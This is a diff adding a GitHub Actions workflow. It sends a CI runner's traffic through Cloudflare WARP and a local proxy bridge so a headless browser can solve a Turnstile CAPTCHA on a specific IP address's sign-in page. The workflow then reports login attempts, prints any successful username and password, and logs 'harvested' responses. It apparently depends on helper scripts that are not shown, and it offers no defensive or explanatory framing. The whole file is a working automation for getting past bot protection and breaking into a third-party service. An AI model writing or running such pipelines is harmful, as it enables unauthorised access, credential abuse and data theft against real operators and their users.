@@ -1,0 +1,124 @@
+name: i53906warp
+on:
+  workflow_dispatch:
+    inputs:
+      nt:
+        description: "ntfy topic"
+        required: false
+        default: "i53906warpx7"
+permissions:
+  contents: read
+jobs:
+  warp:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: egress + target baseline BEFORE warp
+        run: |
+          echo "=== runner ==="; id -u; uname -r
+          (curl -s --max-time 10 https://api.ipify.org || echo noip) | sed 's/^/PRE_EGRESS_IP=/'
+          curl -s -m 15 -o /dev/null -w "pre target /api/status http=%{http_code}\n" http://135.148.204.37/api/status || true
+
+      - name: install + register Cloudflare WARP (proxy mode, IPv4+IPv6)
+        run: |
+          bash setup_warp.sh 2>&1 | tee warp_setup.log
+          cat warp_method.env 2>/dev/null || true
+
+      - name: install browser deps
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq xvfb >/dev/null 2>&1 || true
+          python3 -m pip install --quiet --upgrade pip
+          python3 -m pip install --quiet playwright
+          python3 -m playwright install --with-deps chromium 2>&1 | tail -2
+          (google-chrome --version || chromium --version || echo no-system-chrome) 2>&1 | head -2
+
+      - name: solve mini via WARP socks5 (Cloudflare-native egress)
+        env:
+          NT: ${{ github.event.inputs.nt }}
+        run: |
+          set -o pipefail
+          SRC=""
+          grep -q "warp-cli-proxy" warp_method.env 2>/dev/null && SRC="socks5://127.0.0.1:40000"
+          echo "PROXY_SOURCE=$SRC"
+          if [ -z "$SRC" ]; then
+            echo "warp proxy mode unavailable -> trying tunnel/direct mode"
+            MODE=mini PROXY="" BUDGET=150 xvfb-run -a --server-args="-screen 0 1280x900x24" python3 warp_solver.py 2>&1 | tail -60 || true
+          else
+            MODE=mini PROXY="$SRC" BUDGET=150 xvfb-run -a --server-args="-screen 0 1280x900x24" python3 warp_solver.py 2>&1 | tail -60 || true
+          fi
+          python3 - <<'EOF' || true
+          import json,glob
+          for f in glob.glob('results_*.json'):
+              d=json.load(open(f)); s=d['solve']
+              print(f, 'token_len', s['token_len'], 'frames', s['frames'][-6:], 'err', s.get('err'), 'console', s['console'][-5:])
+          EOF
+
+      - name: solve full real /sign-in page via WARP (if needed)
+        env:
+          NT: ${{ github.event.inputs.nt }}
+        run: |
+          T=$(python3 -c "import json;print(json.load(open('results_mini.json'))['solve']['token_len'])" 2>/dev/null || echo 0)
+          if [ "$T" != "0" ]; then echo "mini already obtained token_len=$T"; exit 0; fi
+          SRC=$(grep -q warp-cli-proxy warp_method.env 2>/dev/null && echo socks5://127.0.0.1:40000 || echo "")
+          MODE=full PROXY="$SRC" BUDGET=120 xvfb-run -a --server-args="-screen 0 1280x900x24" python3 warp_solver.py 2>&1 | tail -60 || true
+          python3 - <<'EOF' || true
+          import json
+          d=json.load(open('results_full.json')); s=d['solve']
+          print('FULL token_len', s['token_len'], 'frames', s['frames'][-8:], 'err', s.get('err'), 'console', s['console'][-6:])
+          EOF
+
+      - name: solve via HTTP bridge -> WARP socks5 (if still no token)
+        env:
+          NT: ${{ github.event.inputs.nt }}
+        run: |
+          T1=$(python3 -c "import json;print(json.load(open('results_mini.json'))['solve']['token_len'])" 2>/dev/null || echo 0)
+          T2=$(python3 -c "import json;print(json.load(open('results_full.json'))['solve']['token_len'])" 2>/dev/null || echo 0)
+          if [ "$T1" != "0" ] || [ "$T2" != "0" ]; then echo "token already obtained"; exit 0; fi
+          if grep -q warp-cli-proxy warp_method.env 2>/dev/null; then
+            UPSTREAMS="socks5://127.0.0.1:40000" python3 bridge_warp.py 8899 > bridge_warp.log 2>&1 &
+            BP=$!; sleep 2
+            curl -s -m 40 -x http://127.0.0.1:8899 -o /dev/null -w "bridge->target http=%{http_code} t=%{time_total}\n" http://135.148.204.37/api/status || true
+            curl -s -m 40 -x http://127.0.0.1:8899 -o /dev/null -w "bridge->cf api.js http=%{http_code} size=%{size_download}\n" "https://challenges.cloudflare.com/turnstile/v0/api.js" || true
+            MODE=mini PROXY="http://127.0.0.1:8899" BUDGET=170 xvfb-run -a --server-args="-screen 0 1280x900x24" python3 warp_solver.py 2>&1 | tail -60 || true
+            kill $BP 2>/dev/null || true
+            tail -20 bridge_warp.log || true
+          else
+            echo "no bridge target (tunnel mode)"
+          fi
+
+      - name: summarize
+        if: always()
+        run: |
+          python3 - <<'EOF'
+          import json,glob
+          for f in sorted(glob.glob('results_*.json')):
+              try: d=json.load(open(f))
+              except Exception: continue
+              s=d.get('solve',{})
+              print('==',f,'mode',d.get('mode'),'proxy',d.get('proxy'),'token_len',s.get('token_len'),
+                    'niframes',s.get('niframes'),'err',s.get('err'))
+              print('   frames',s.get('frames'))
+              print('   console',s.get('console')[:10])
+              print('   reqfail',s.get('reqfail')[:6])
+              for a in d.get('attempts',[]): print('   LOGIN',a['u'],a['status'],a['body'][:160])
+              if d.get('login'): print('   LOGIN_SUCCESS',d['login']['username'],'pass=',d['login']['password'])
+              for k,v in (d.get('harvest') or {}).items(): print('   HARVEST',k,v.get('status'),str(v.get('body'))[:240])
+          EOF
+          echo "--- warp method ---"; cat warp_method.env 2>/dev/null
+
+      - name: upload diagnostics
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: diag53906
+          path: |
+            results_*.json
+            warp_setup.log
+            warp_method.env
+            bridge_warp.log
+            last_*.html
+            *.png
+          if-no-files-found: ignore
